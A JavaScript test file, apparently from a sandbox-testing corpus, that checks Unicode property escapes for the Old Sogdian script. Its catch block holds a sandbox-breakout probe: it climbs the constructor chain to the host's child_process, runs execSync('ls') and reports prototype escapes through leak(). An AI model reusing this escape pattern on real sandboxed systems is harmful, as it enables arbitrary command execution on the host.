try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [[
                69376,
                69415
            ]]
    });
    testPropertyEscapes(/^\p{Script=Old_Sogdian}+$/u, matchSymbols, '\\p{Script=Old_Sogdian}');
    testPropertyEscapes(/^\p{Script=Sogo}+$/u, matchSymbols, '\\p{Script=Sogo}');
    testPropertyEscapes(/^\p{sc=Old_Sogdian}+$/u, matchSymbols, '\\p{sc=Old_Sogdian}');
    testPropertyEscapes(/^\p{sc=Sogo}+$/u, matchSymbols, '\\p{sc=Sogo}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                69375
            ],
            [
                69416,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Old_Sogdian}+$/u, nonMatchSymbols, '\\P{Script=Old_Sogdian}');
    testPropertyEscapes(/^\P{Script=Sogo}+$/u, nonMatchSymbols, '\\P{Script=Sogo}');
    testPropertyEscapes(/^\P{sc=Old_Sogdian}+$/u, nonMatchSymbols, '\\P{sc=Old_Sogdian}');
    testPropertyEscapes(/^\P{sc=Sogo}+$/u, nonMatchSymbols, '\\P{sc=Sogo}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}